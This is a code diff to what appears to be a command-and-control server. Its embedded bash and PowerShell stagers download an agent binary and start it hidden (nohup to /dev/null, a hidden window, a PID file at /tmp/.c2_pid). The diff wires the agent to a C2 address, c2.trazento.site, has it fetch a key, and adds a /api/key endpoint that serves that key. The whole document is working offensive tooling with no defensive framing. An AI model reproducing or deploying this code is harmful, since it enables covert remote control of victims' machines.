@@ -451,8 +451,13 @@ else
   echo "need curl or wget"; exit 1
 fi
 chmod +x "$AGENT"
+# derive server base from download URL
+BASE="${C2_AGENT_URL%/agent/*}"
+if [ -z "$BASE" ]; then
+  BASE="https://c2.trazento.site"
+fi
 echo "[*] Starting agent in background..."
-nohup "$AGENT" >/dev/null 2>&1 &
+nohup "$AGENT" --server "$BASE" --fetch-key >/dev/null 2>&1 &
 echo "$!" > /tmp/.c2_pid
 echo "[+] Agent running (PID $!)"
 """
@@ -463,7 +468,8 @@ Write-Host "[*] Downloading C2 agent..."
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 iwr $url -OutFile $out
 Write-Host "[*] Starting agent..."
-Start-Process -WindowStyle Hidden -FilePath $out
+$base = if ($env:C2_AGENT_URL) { $env:C2_AGENT_URL -replace '/agent/windows/.*$','' } else { "https://c2.trazento.site" }
+Start-Process -WindowStyle Hidden -FilePath $out -ArgumentList "--server $base --fetch-key"
 """
 
 BIN_DIR = os.path.dirname(os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__))
@@ -505,6 +511,12 @@ def serve_agent_darwin(arch):
         return jsonify({"error": "agent binary not found"}), 404
     with open(path, 'rb') as f:
         return Response(f.read(), mimetype='application/octet-stream')
+
+@app.route('/api/key')
+def get_server_key():
+    if KEY_B64:
+        return jsonify({"key": KEY_B64})
+    return jsonify({"error": "key not ready"}), 503
 
 if __name__ == '__main__':
     if "--show-token" in sys.argv:
